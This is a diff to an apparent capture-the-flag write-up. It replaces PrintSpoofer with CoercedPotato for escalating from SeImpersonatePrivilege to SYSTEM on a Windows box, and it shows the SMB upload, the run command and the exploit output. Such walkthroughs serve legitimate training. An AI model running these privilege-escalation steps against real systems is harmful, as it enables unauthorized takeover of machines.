@@ -560,26 +560,42 @@ Then we can upload a reverse shell:
 	...
 	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 
-Since <b>SeImpersonatePrivilege</b> is enabled we can escalate out privileges using some tools, I used PrintSpoofer: https://github.com/itm4n/PrintSpoofer
+Since <b>SeImpersonatePrivilege</b> is enabled we can escalate out privileges using some <i>Potatoes :)</i>, I used [CoercedPotato](https://github.com/hackvens/CoercedPotato) since it is one of most simple to use it and should works even on the most recent windows OS (11 and 22):
 
- 	smb: \> put PrintSpoofer64.exe 
-	putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (51.4 kb/s) (average 141.9 kb/s)
+ 	smb: \> put CoercedPotato.exe 
+	putting file CoercedPotato.exe as \CoercedPotato.exe (168.4 kb/s) (average 147.5 kb/s)
 
 Then we can execute the following command to get a shell as system:
 
-	C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
-	PrintSpoofer64.exe -i -c cmd
-	[+] Found privilege: SeImpersonatePrivilege
-	[+] Named pipe listening...
-	[+] CreateProcessAsUser() OK
+	C:\inetpub\wwwroot\nt4wrksv>.\CoercedPotato.exe -c cmd.exe
+        ...						     
+                                                                  
+	[+] RUNNING ALL KNOWN EXPLOITS.
+	
+	[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\YrRlvc\pipe\spoolss.
+	[PIPESERVER] Named pipe '\\.\pipe\YrRlvc\pipe\spoolss' listening...
+	
+	[MS-RPRN] [*] Attempting MS-RPRN functions...
+	
+	[MS-RPRN] Starting RPC functions fuzzing...
+	 [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/YrRlvc
+	
+	[PIPESERVER] A client connected!
+	
+	 ** Exploit completed **
+	
 	Microsoft Windows [Version 10.0.14393]
 	(c) 2016 Microsoft Corporation. All rights reserved.
 	
 	C:\Windows\system32>whoami
- 	nt authority\system
+	whoami
+	nt authority\system
 
-More information: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges.
-Here you can check which <i>potatoes</i> still works: https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
+If you did not know (like me) the subject of this exploit I suggest to read the following posts:
+1. This explain how to take advantage of the named pipes, the same principle applies on CoercedPotato too:
+https://itm4n.github.io/printspoofer-abusing-impersonate-privileges.
+2. Here you can check which <i>potatoes</i> still works at the moment (05.2024): 
+https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
 
 
 	
